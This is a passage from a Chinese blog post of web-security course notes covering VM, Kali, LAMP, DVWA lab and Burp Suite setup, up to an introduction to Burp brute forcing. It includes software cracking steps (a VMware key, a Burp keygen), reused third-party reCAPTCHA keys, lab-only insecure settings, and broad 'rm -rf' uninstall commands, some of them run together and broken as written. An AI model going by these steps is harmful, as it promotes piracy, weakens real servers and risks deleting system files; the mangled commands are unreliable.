    </a>
  </span>
  
  <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>99k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>1:30</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <p>web安全学习笔记（painter）</p>
<p>#学习总纲</p>
<pre><code>1、边学习，边挖src
2、课程学习只是了解的过程，让我们有个概念，但是学习的时候笔记需要做好，方便以后需要查看细节、具体命令的时候可以查找
3、涉及到一些漏洞的讲解，比如url跳转、任意密码修改、越权、支付漏洞等，其中涉及到payload的，直接利用即可，因为靶场是后面搭建的，一些漏洞页面都没有，仅仅是为了让我们了解，所以直接利用payload即可，无需搞懂payload怎么来的，因为没有漏洞页面给我们使用。
</code></pre>
<span id="more"></span>




<p>.</p>
<h1 id="第一章：环境和工具安装"><a href="#第一章：环境和工具安装" class="headerlink" title="第一章：环境和工具安装"></a>第一章：环境和工具安装</h1><h2 id="1、vm的安装和破解"><a href="#1、vm的安装和破解" class="headerlink" title="1、vm的安装和破解"></a>1、vm的安装和破解</h2><p>vmwareworkstation下载15系列即可，16系列win7无法使用<br>vmware的破解：百度随便一个激活密钥都可以</p>
<p>易错点1：<br>安装vmtools，会提示啥没权限，提示“Alias manager and ticket service(VGAuthservice)启动失败,请确保您有足够的权限启动系统服务。<br>解决方法：安装微软运行库微软常用运行库合集? <a target="_blank" rel="noopener" href="https://www.duote.com/soft/330683.html">https://www.duote.com/soft/330683.html</a></p>
<p><img src="/source/hetian/image-20210202141558674.png" alt="image-20210202141558674"></p>
<p>易错点2：<br>安装win10，在创建win10虚拟机后，打开虚拟机，没有显示安装界面，而是bios界面</p>
<p><img src="/source/hetian/image-20210202141615584.png" alt="image-20210202141615584"></p>
<p>解决方法：将固件类型改为bios</p>
<p><img src="/source/hetian/image-20210202141634594.png" alt="image-20210202141634594"></p>
<h2 id="2、安装kali"><a href="#2、安装kali" class="headerlink" title="2、安装kali"></a>2、安装kali</h2><p>1、添加kali虚拟机：（也可以通过下载kali的虚拟机直接导入即可，免去了安装的等待时间）</p>
<p><img src="/source/hetian/image-20210202141704704.png" alt="image-20210202141704704"></p>
<p>2、选择稍后安装</p>
<p><img src="/source/hetian/image-20210202141722430.png" alt="image-20210202141722430"></p>
<p>3、选择linux–debian 7.x 64位</p>
<p><img src="/source/hetian/image-20210202141735823.png" alt="image-20210202141735823"></p>
<p>4、设置名字和安装的目录</p>
<p><img src="/source/hetian/image-20210202141748656.png" alt="image-20210202141748656"></p>
<p>5、性能配置：稍微大一点，4个内核，内存分配2g</p>
<p><img src="/source/hetian/image-20210202141819319.png" alt="image-20210202141819319"></p>
<p>6、选择nat网络模式</p>
<p><img src="/source/hetian/image-20210202141830949.png" alt="image-20210202141830949"></p>
<p>7、剩下2个默认即可</p>
<p><img src="/source/hetian/image-20210202141842930.png" alt="image-20210202141842930"></p>
<p><img src="/source/hetian/image-20210202141848442.png" alt="image-20210202141848442"></p>
<p>8、创建新虚拟磁盘—80g—将虚拟磁盘存储为单个文件</p>
<p><img src="/source/hetian/image-20210202141905731.png" alt="image-20210202141905731"></p>
<p>9、自定义硬件—打印机没什么用，移除</p>
<p><img src="/source/hetian/image-20210202141917142.png" alt="image-20210202141917142"></p>
<p>10、设置cd/dvd</p>
<p><img src="/source/hetian/image-20210202141930688.png" alt="image-20210202141930688"></p>
<p>11、正式开始安装kali系统<br>意见建议：在这里可以先将kali内存调整大一些，这样安装系统会快一些，安装完了再调整回来即可，我这里先设置为6g</p>
<p><img src="/source/hetian/image-20210202141952212.png" alt="image-20210202141952212"></p>
<p>12、开启虚拟机–第一个图形化安装</p>
<p><img src="/source/hetian/image-20210202142005101.png" alt="image-20210202142005101"></p>
<p>13、简体中文–中国—汉语</p>
<p>14、设立主机名（kali）—域名不用输入，空着–设立用户名全名（kali）–设立用户名（kali）–设立密码（kali）<br>15、使用整个磁盘（默认）–所有文件放在一个分区中（默认）–下图界面直接点击继续</p>
<p><img src="/source/hetian/image-20210202142033685.png" alt="image-20210202142033685"></p>
<p>16.改为写入磁盘，选择  “是”</p>
<p><img src="/source/hetian/image-20210202142046998.png" alt="image-20210202142046998"></p>
<p>17、软件选择：默认即可，不要乱动</p>
<p><img src="/source/hetian/image-20210202142057453.png" alt="image-20210202142057453"></p>
<p>18.默认将GRUB安装到主驱动器（选择 是）</p>
<p><img src="/source/hetian/image-20210202142110835.png" alt="image-20210202142110835"></p>
<p>19.选择dev/sda</p>
<p>20、更新kali源：<br>vim /etc/apt/sources.list   打开更新源的存储文件<br>1、打开后，在键盘上按下‘i’即可进入编辑状态，将光标移到最后，然后右键粘贴新的更新源即可<br>2、保存并退出：编辑状态下按下ESC，然后输入 :wq    即可<br>3、更新源的地址如下：直接拷贝即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#中科大</span></span><br><span class="line">deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line"> <span class="comment">#阿里云</span></span><br><span class="line">deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line"> <span class="comment">#清华大学</span></span><br><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line">deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line"> <span class="comment">#浙大</span></span><br><span class="line">deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line">deb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line"> <span class="comment">#东软大学</span></span><br><span class="line">deb http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib</span><br><span class="line">deb-src http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib</span><br><span class="line"><span class="comment">#重庆大学</span></span><br><span class="line">deb http://http.kali.org/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://http.kali.org/kali kali-rolling main non-free contrib</span><br><span class="line"><span class="comment">#163 Kali源</span></span><br><span class="line">deb http://mirrors<span class="number">.163</span>.com/debian wheezy main non-free contrib</span><br><span class="line">deb-src http://mirrors<span class="number">.163</span>.com/debian wheezy main non-free contrib</span><br><span class="line">deb http://mirrors<span class="number">.163</span>.com/debian wheezy-proposed-updates main non-free contrib</span><br><span class="line">deb-src http://mirrors<span class="number">.163</span>.com/debian wheezy-proposed-updates main non-free contrib</span><br><span class="line">deb-src http://mirrors<span class="number">.163</span>.com/debian-security wheezy/updates main non-free contrib</span><br><span class="line">deb http://mirrors<span class="number">.163</span>.com/debian-security wheezy/updates main non-free contrib</span><br></pre></td></tr></table></figure>



<p>21、用命令更新一下更新源：apt-get update</p>
<p><img src="/source/hetian/image-20210202142216936.png" alt="image-20210202142216936"></p>
<p><strong>补充：linux常用命令</strong><br>passwd root  修改root用户密码<br>最后，完全安装完成后，安装vmtools，然后拍摄快照</p>
<h2 id="3、安装win7"><a href="#3、安装win7" class="headerlink" title="3、安装win7"></a>3、安装win7</h2><p>目的：为了打开不明文件，和当做靶机使用</p>
<p>win7的安装：一定要选择安装版<br>win7：<a target="_blank" rel="noopener" href="http://www.winwin7.com/Win7QiJianBan/Win7AZB-2133.html">http://www.winwin7.com/Win7QiJianBan/Win7AZB-2133.html</a><br>具体添加虚拟机的步骤和kali一样，分配内存的话可以小点，1g内存，20g磁盘，1核</p>
<h2 id="4、安装win10"><a href="#4、安装win10" class="headerlink" title="4、安装win10"></a>4、安装win10</h2><p>目的：为了打开不明文件，和当做靶机使用<br>win10的安装：一定要选择安装版<br>win10：<a target="_blank" rel="noopener" href="http://www.winwin7.com/Win10/AZB-5191.html">http://www.winwin7.com/Win10/AZB-5191.html</a><br>具体添加虚拟机的步骤和kali一样，分配内存的话可以小点，1g内存，20g磁盘，1核</p>
<h2 id="5、安装phpstudy"><a href="#5、安装phpstudy" class="headerlink" title="5、安装phpstudy"></a>5、安装phpstudy</h2><h2 id="6、安装LAMP"><a href="#6、安装LAMP" class="headerlink" title="6、安装LAMP"></a>6、安装LAMP</h2><p>lamp：linux+apache+mysql+php<br>Lanmp：linux+apache+nginx+mysql+php<br>Lamp的安装：这里直接用kali安装了<br>注意事项：安装前建议先做好快照，这样出问题后可以还原<br>一、安装apache</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install apache2 </span><br></pre></td></tr></table></figure>

<p><img src="/source/hetian/image-20210202181038859.png" alt="image-20210202181038859"></p>
<p>1、 查看apache的状态</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service apache2 status</span><br></pre></td></tr></table></figure>

<p><img src="/source/hetian/image-20210202181155969.png" alt="image-20210202181155969"></p>
<p>2、启动apache并查看状态</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">service apache2 start </span><br><span class="line">service apache2 status</span><br></pre></td></tr></table></figure>

<p><img src="/source/hetian/image-20210202181257353.png" alt="image-20210202181257353"></p>
<p>3、至此，apache2安装成功</p>
<p>二、安装mysql<br>注意事项：kali默认安装了，若使用kali则不需要安装，只需要启动即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt insttall mariadb mariadb-server   安装</span><br><span class="line">service mariadb status   查看状态</span><br><span class="line">service mariadb start    启动mariadb</span><br></pre></td></tr></table></figure>

<p><img src="/source/hetian/image-20210202181536681.png" alt="image-20210202181536681"></p>
<p>三、安装php<br>易错点：kali已经默认安装好了，不需要再安装了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt -y install php7.0 php-pear libapache2-mod-php7.0 php7.0-mysql php7.0-curl php7.0-json php7.0-cgi php7.0-gd</span><br></pre></td></tr></table></figure>

<p>易错点：出现无法定位软件包，此时需要更新源，更新源的时候需要把官方源注释掉</p>
<p>检查kali是否正确安装php</p>
<p>1、打开目录cd /var/www/html<br>2、创建文件 info.php方法一：vim info.php<br>然后输入内容并保存：<?php phpinfo();?>方法二：直接命令行导入内容：echo “<?php phpinfo();?>“ &gt; info.php</p>
<p>3、浏览器访问：127.0.0.1/info.php 出现先得php探针界面就代表安装正确</p>
<p><img src="/source/hetian/image-20210202181810913.png" alt="image-20210202181810913"></p>
<p>将apache2和maridb添加到自启动：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl enable apache2</span><br><span class="line">systemctl enable mariadb</span><br></pre></td></tr></table></figure>

<p><img src="/source/hetian/image-20210202181900513.png" alt="image-20210202181900513"></p>
<p><img src="/source/hetian/image-20210202181904731.png" alt="image-20210202181904731"></p>
<p>卸载lamp</p>
<p>1、卸载 mariadb：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">apt autoremove --purge mariadb mariadb-server</span><br><span class="line">apt remove mariadb mariadb-server</span><br><span class="line">apt remove mysql-common</span><br><span class="line"></span><br><span class="line">通过搜索删除，清空残留文件：dpkg -l |grep ^rc|awk &#x27;&#123;print $2&#125;&#x27; |sudo xargs dpksudo find /etc -name &quot;*mysql*&quot; |xargs rm -</span><br></pre></td></tr></table></figure>



<p>2、卸载 apache</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get --purge remove apache-commsudo apt-get --purge remove apachesudo find /etc -name &quot;*apache*&quot; |xargs rm -rfsudo rm -rf /var/wwwsudo rm -rf /etc/libapache2-mod-jksudo rm -rf /etc/init.d/apache2sudo rm -rf /etc/apache2dpkg -l |grep apache2|awk &#x27;&#123;print $2&#125;&#x27;|xargs dpkg -P</span><br></pre></td></tr></table></figure>



<p>3、卸载 php：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt --purge remove libapache2-mod-php7 php7 php7-gd php7-mysqlapt autoremove php7sudo find /etc -name &quot;*php*&quot; |xargs rm –rfdpkg -l |grep ^rc|awk ’&#123;print $2&#125;’ |sudo xargs dpkg -P</span><br></pre></td></tr></table></figure>

<p>最后用 dpkg -l | grep php 和 dpkg -l | grep php5 检查，如无返回即干净卸载</p>
<h2 id="7、安装java环境"><a href="#7、安装java环境" class="headerlink" title="7、安装java环境"></a>7、安装java环境</h2><p>作用：后续的burpsuit的使用需要该环境</p>
<p>要求：必须要版本为jdk8 的才行</p>
<p>安装：<a target="_blank" rel="noopener" href="https://www.oracle.com/cn/java/technologies/javase-downloads.html">Java SE - Downloads | Oracle Technology Network | Oracle 中国</a></p>
<p>xu’an’z</p>
<p>1、更改安装路径，路径要记下来，后续经常要找该目录</p>
<p><img src="/source/hetian/image-20210202182322203.png" alt="image-20210202182322203"></p>
<p>2、在java的目录下新建一个jre目录，版本号保持和jdk一样，这两个目录必须要在一起，否则会导致各种问题</p>
<p><img src="/source/hetian/image-20210202182335446.png" alt="image-20210202182335446"></p>
<p><img src="/source/hetian/image-20210202182339675.png" alt="image-20210202182339675"></p>
<p>3、安装完后，安装界面会自动关闭，此时需要去jre的目录下，看是否有内容，有就代表安装成功了</p>
<p>4、添加环境变量：</p>
<p>变量名：JAVA_HOME   变量值：jdk的路径，我的是：D:\Java\jdk1.8.0_251</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">变量名：CLASSPATH                                        变量值：.;%JAVA_HOME%\lib;%JAVA_HOME%\lib\tools.jar（第一个分号前前面有一个点）</span><br></pre></td></tr></table></figure>

<p><img src="/source/hetian/image-20210202182453404.png" alt="image-20210202182453404"></p>
<p><img src="/source/hetian/image-20210202182457881.png" alt="image-20210202182457881"></p>
<p>5、修改变量path的值</p>
<p>   在path的值最前方加入：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%JAVA_HOME%\bin;%JAVA_HOME%\jre\bin;</span><br></pre></td></tr></table></figure>

<p><img src="/source/hetian/image-20210202182633974.png" alt="image-20210202182633974"></p>
<p>6、命令行验证看变量是否添加成功：cmd命令窗口输入   java -version   出现版本号即为配置成功</p>
<p><img src="/source/hetian/image-20210202182707499.png" alt="image-20210202182707499"></p>
<h2 id="8、安装python2和3"><a href="#8、安装python2和3" class="headerlink" title="8、安装python2和3"></a>8、安装python2和3</h2><p>易错点：python3.8.7之后的版本不能安装于win7</p>
<p><img src="/source/hetian/image-20210202182808354.png" alt="image-20210202182808354"></p>
<p>python2下载2.7即可，根据自己操作系统的版本下载对应的python3的版本，我这里因为是win7，所以只能下载py3.8.7<br>Python2和python3直接去官网下载即可<br>Python2.7的安装：</p>
<p>1、为所有用户安装</p>
<p><img src="/source/hetian/image-20210202182829263.png" alt="image-20210202182829263"></p>
<p>2、更改安装目录，我这里直接在d盘新建一个python目录，到时候python2和python3都安装在该目录<br>例如：D:\python\Python27\</p>
<p>Python3的安装<br>1、勾选“将python3.8添加到变量”，并且选择自定义安装</p>
<p><img src="/source/hetian/image-20210202182852892.png" alt="image-20210202182852892"></p>
<p>2、默认</p>
<p><img src="/source/hetian/image-20210202183003959.png" alt="image-20210202183003959"></p>
<p>3、选择为所有用户安装，并且更改路径</p>
<p><img src="/source/hetian/image-20210202183015283.png" alt="image-20210202183015283"></p>
<p>配置python2和python3的环境变量<br>1、将python的安装目录和Scripts目录添加到path变量的开头</p>
<p>易错点：每个值后面都要用分号 “；”进行隔开<br>   我这里是：D:\python\Python27<br>             D:\python\Python27\Scripts</p>
<p><img src="/source/hetian/image-20210202183040680.png" alt="image-20210202183040680"></p>
<p>2、python3：因为安装的时候勾选了添加到变量，所以这里就不需要配置了</p>
<p>Py2和py3调用区分<br>Py2：在py2的安装目录了，建立一个python.exe的副本，并将副本命名为python2.exe</p>
<p><img src="/source/hetian/image-20210202183140869.png" alt="image-20210202183140869"></p>
<p>Py3：和python2一样，建立一个python3</p>
<h2 id="9、DVWA靶场安装"><a href="#9、DVWA靶场安装" class="headerlink" title="9、DVWA靶场安装"></a>9、DVWA靶场安装</h2><p>DVWA环境要求：lamp环境，所以这里直接在kali中部署</p>
<p>1、下载地<a target="_blank" rel="noopener" href="https://codeload.github.com/digininja/DVWA/zip/master">https://codeload.github.com/digininja/DVWA/zip/master</a><br>易错点：有时候网站打不开，可以通过别人的分享下载<br>2、将压缩包拖入kali桌面中，前提是我安装了vmtools<br>3、命令行切换到桌面：cd /root/桌面  </p>
<p><img src="/source/hetian/image-20210202183322414.png" alt="image-20210202183322414"></p>
<p>4、将压缩包解压：unzip DVWA-master.zip<br>5、mv DVWA-master /var/www/html/dvwa<br>6、切换到dvwa目录并查看该目录内容：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /var/www/html/dvwa ls</span><br></pre></td></tr></table></figure>

<p><img src="/source/hetian/image-20210202183427139.png" alt="image-20210202183427139"></p>
<p>7、启动apache2</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">启动：service apache2 start查看状态:service apache2 status</span><br></pre></td></tr></table></figure>



<p>8、启动mariadb</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">启动：service mariadb start查看状态：service mariadb status</span><br></pre></td></tr></table></figure>



<p>9、浏览器访问dvwa      <a target="_blank" rel="noopener" href="http://127.0.0.1/dvwa/">http://127.0.0.1/dvwa/</a><br>报错：提示没有发现配置文件</p>
<p><img src="/source/hetian/image-20210202183623364.png" alt="image-20210202183623364"></p>
<p>解决方法：<br>在dvwa目录下找到config.inc.php.dist，发现它在config目录下，我们切换进去，并且复制一份，重命名为php格式</p>
<p><img src="/source/hetian/image-20210202183720198.png" alt="image-20210202183720198"></p>
<p>10、再次浏览器访问dvwa，发现还有多处需要配置</p>
<p><img src="/source/hetian/image-20210202183732682.png" alt="image-20210202183732682"></p>
<p>11、配置php</p>
<p> function allow_url_include<br>修改配置文件：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/php/7.4/apache2/php.ini 接着再vim界面输入：/allow_url_include 搜索到之后，按下enter，再按下i即可进行修改将off改为on重启apache2服务：service apache2 restart</span><br></pre></td></tr></table></figure>



<p>配置PHP module gd:</p>
<p>安装php-gd：apt install php-gd -y </p>
<p><img src="/source/hetian/image-20210202184033636.png" alt="image-20210202184033636"></p>
<p>重启apache2：service apache2 restart</p>
<p>12、配置mysql<br>编辑dvwa配置文件：vim /var/www/html/dvwa/config/config.inc.php<br>配置mysql的账号和密码，密码设置为dvwa，后面会有操作创建该账户和密码的</p>
<p><img src="/source/hetian/image-20210202184138162.png" alt="image-20210202184138162"></p>
<p>13、配置reCAPTCHA key<br>这是谷歌的一个证书，用来验证人机登录的，因为自己申请被墙了，所以直接百度找了一个。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_DVWA[ &#x27;recaptcha_public_key&#x27; ]  = &#x27;6LdK7xITAAzzAAJQTfL7fu6I-0aPl8KHHieAT_yJg&#x27;;$_DVWA[&#x27;recaptcha_private_key&#x27;]=&#x27;6LdK7xITAzzAAL_uw9YXVUOPoIHPZLfw2K1n5NVQ&#x27;;</span><br></pre></td></tr></table></figure>



<p>14、修改文件夹权限<br>uploads添加权限</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /var/www/html/dvwa/hackablechmod 777 uploads</span><br></pre></td></tr></table></figure>

<p><img src="/source/hetian/image-20210202184501486.png" alt="image-20210202184501486"></p>
<p>tmp添加权限<br>cd /var/www/html/dvwa/external/phpids/0.6/lib/IDS/<br>给tmp目录及目录下的所有文件添加权限：chmod 777 -R tmp</p>
<p><img src="/source/hetian/image-20210202184522471.png" alt="image-20210202184522471"></p>
<p>Config目录添加权限</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /var/www/html/dvwa/chmod 777  config  </span><br></pre></td></tr></table></figure>

<p><img src="/source/hetian/image-20210202184748454.png" alt="image-20210202184748454"></p>
<p>15、创建一个dvwa的数据用户<br>易错点：确保该用户名和密码和dvwa的配置文件里的一样<br>进入mysql：输入mysql<br>创建用户dvwa@localhost，密码dvwa</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create user &#x27;dvwa@localhost&#x27; identified by &#x27;dvwa&#x27;;</span><br></pre></td></tr></table></figure>

<p><img src="/source/hetian/image-20210202184824694.png" alt="image-20210202184824694"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">赋予权限：grant all privileges on *.* to ‘dvwa@localhost’;刷新权限：flush privileges;易错点：上面的命令，最后面的分号“;”不能少</span><br></pre></td></tr></table></figure>

<p><img src="/source/hetian/image-20210202185000574.png" alt="image-20210202185000574"></p>
<p>16、重启mariadb和apache2</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service mariadb restartservice apache2 restart</span><br></pre></td></tr></table></figure>



<p>17、浏览器访问dvwa，点击下发的创建数据库，等待一会，就会跳转到登录界面，就代表配置成功了。我们可以使用默认账户admin和密码password进行登录</p>
<p><img src="/source/hetian/image-20210202185052760.png" alt="image-20210202185052760"></p>
<p><img src="/source/hetian/image-20210202185101298.png" alt="image-20210202185101298"></p>
<p>DVWA的日常开启：</p>
<p>service apache2 start</p>
<p>默认密码：</p>
<p>admin   password</p>
<p>gordonb/abc123</p>
<p>1337/charley</p>
<p>pablo/letmein</p>
<p>smithy/password</p>
<p>windows下安装：建议使用phpstudy2018，别使用phpstudy8.0，不好用，容易出错</p>
<p>1、下载，解压，改名为dvwa，然后放到www目录</p>
<p>2、修改配置文件后缀，改为php后缀</p>
<p><img src="/source/hetian/image-20210210132655714.png" alt="image-20210210132655714"></p>
<p>3、打开config配置文件，修改数据库密码为dvwa</p>
<p><img src="/source/hetian/image-20210210213537182.png" alt="image-20210210213537182"></p>
<p>4、本地访问：127.0.0.1/dvwa</p>
<p><img src="/source/hetian/image-20210210132832766.png" alt="image-20210210132832766"></p>
<p>5、看到页面有两个红色的状态，表示一些配置需要更改</p>
<p>将allow_url_include设为on状态</p>
<p>首先打开php.ini，在phpstudy里修改，我这里以phpstudy2018来演示</p>
<p><img src="/source/hetian/image-20210210135341065.png" alt="image-20210210135341065"></p>
<p><img src="/source/hetian/image-20210210132514201.png" alt="image-20210210132514201"></p>
<p>6、修改recaptcha_public_key，这里使用网上找的，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_DVWA[ &#x27;recaptcha_public_key&#x27; ]  = &#x27;6LdK7xITAAzzAAJQTfL7fu6I-0aPl8KHHieAT_yJg&#x27;;$_DVWA[&#x27;recaptcha_private_key&#x27;]=&#x27;6LdK7xITAzzAAL_uw9YXVUOPoIHPZLfw2K1n5NVQ&#x27;;</span><br></pre></td></tr></table></figure>



<p>7、创建数据库账户，根据config配置文件来创建对应的数据库名、用户、密码</p>
<p>执行命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create user &#x27;dvwa@localhost&#x27; identified by &#x27;dvwa&#x27;;    创建dvwa数据库用户，密码也为dvwa grant all privileges on *.* to &#x27;dvwa@localhost&#x27;;   赋予权限  flush privileges;       刷新权限</span><br></pre></td></tr></table></figure>

<p><img src="/source/hetian/image-20210210213656557.png" alt="image-20210210213656557"></p>
<p><img src="/source/hetian/image-20210210141351923.png" alt="image-20210210141351923"></p>
<p><img src="/source/hetian/image-20210210141709404.png" alt="image-20210210141709404"></p>
<p>8、重启apache，刷新页面，发现没有问题了，接着点击下面的create</p>
<p><img src="/source/hetian/image-20210210135409051.png" alt="image-20210210135409051"></p>
<p>9、登录：admin    password</p>
<h2 id="10、安全工具的安装"><a href="#10、安全工具的安装" class="headerlink" title="10、安全工具的安装"></a>10、安全工具的安装</h2><h3 id="1、Burpsuit的安装"><a href="#1、Burpsuit的安装" class="headerlink" title="1、Burpsuit的安装"></a>1、Burpsuit的安装</h3><p>安装包：详见下发的工具包<br>工具资料-Hetian\合天工具库-Hetian\代理抓包\BurpSuite2.1.07<br>Burpsuit的破解：<br>1、点击破解程序：burp-loader-keygen-2_1_07.jar    然后点击右边的run</p>
<p><img src="/source/hetian/image-20210202185208248.png" alt="image-20210202185208248"></p>
<p>2、复制粘贴license</p>
<p><img src="/source/hetian/image-20210202185219818.png" alt="image-20210202185219818"></p>
<p>3、点击从左到右第三个按钮</p>
<p><img src="/source/hetian/image-20210202185345476.png" alt="image-20210202185345476"></p>
<p>4、按照图示操作</p>
<p><img src="/source/hetian/image-20210202185356069.png" alt="image-20210202185356069"></p>
<p>5、至此，破解成功，以后每次使用burp，直接打开burp-loader-keygen-2_1_07.jar 就行了</p>
<p>安装burpsuit的证书：有这个证书才能抓https<br>1、查看并记下ip和端口：127.0.0.1:8080</p>
<p><img src="/source/hetian/image-20210202185411889.png" alt="image-20210202185411889"></p>
<p>2、打开专用版火狐，新建代理</p>
<p><img src="/source/hetian/image-20210202185421893.png" alt="image-20210202185421893"></p>
<p><img src="/source/hetian/image-20210202185508285.png" alt="image-20210202185508285"></p>
<p><img src="/source/hetian/image-20210202185512873.png" alt="image-20210202185512873"></p>
<p>3、打开burp的拦截按钮</p>
<p><img src="/source/hetian/image-20210202185524025.png" alt="image-20210202185524025"></p>
<p>4、访问http协议的网站即可抓取<br>5、访问https的发现无法抓取，此时就需要安装证书</p>
<p><img src="/source/hetian/image-20210202185534355.png" alt="image-20210202185534355"></p>
<p>6、安装证书：在拦截状态下访问：http:burp  ，右上角点击下载到桌面</p>
<p><img src="/source/hetian/image-20210202185546341.png" alt="image-20210202185546341"></p>
<p>7、将证书导入到火狐</p>
<p><img src="/source/hetian/image-20210202185555225.png" alt="image-20210202185555225"></p>
<p><img src="/source/hetian/image-20210202185702895.png" alt="image-20210202185702895"></p>
<p>8、选择  信任该标识的网站</p>
<p><img src="/source/hetian/image-20210202185713913.png" alt="image-20210202185713913"></p>
<p>9、测试<a target="_blank" rel="noopener" href="https://www.baidu.com/">https://www.baidu.com</a>   抓取成功</p>
<p><img src="/source/hetian/image-20210202185724002.png" alt="image-20210202185724002"></p>
<p>易错点：<br>1、burp里的代理无法勾选或无法抓包<br>  请检查是否开启了多个burp</p>
<h1 id="第二章：web安全基础"><a href="#第二章：web安全基础" class="headerlink" title="第二章：web安全基础"></a>第二章：web安全基础</h1><h2 id="1、burp的简单实用-爆破弱口令"><a href="#1、burp的简单实用-爆破弱口令" class="headerlink" title="1、burp的简单实用/爆破弱口令"></a>1、burp的简单实用/爆破弱口令</h2><p>预习笔记：</p>
<p>暴力破解核心：服务器对我们的多次请求不做限制，所以我们每次在暴力破解前最好对包进行重放测试，用compare模块</p>
<p>1、burp的作用：类似于中间人，客户端和服务端之间的数据交互会经过burp<br>2、暴力破解的核心：字典，字典需要收集<br>3、compare模块：比较2个数据包的差异</p>
<p><img src="/source/hetian/image-20210202190225075.png" alt="image-20210202190225075"></p>
<p><img src="/source/hetian/image-20210202190228615.png" alt="image-20210202190228615"></p>
<p>4、repeater模块：发送多次请求测试服务器的响应（暴力破解前必须要做该步骤），主要是用来多次发送请求</p>
<p><img src="/source/hetian/image-20210202190239846.png" alt="image-20210202190239846"></p>
<p>5、intruder模块：暴力破解模块</p>
<p><img src="/source/hetian/image-20210202190254073.png" alt="image-20210202190254073"></p>
<p><img src="/source/hetian/image-20210202190300587.png" alt="image-20210202190300587"></p>
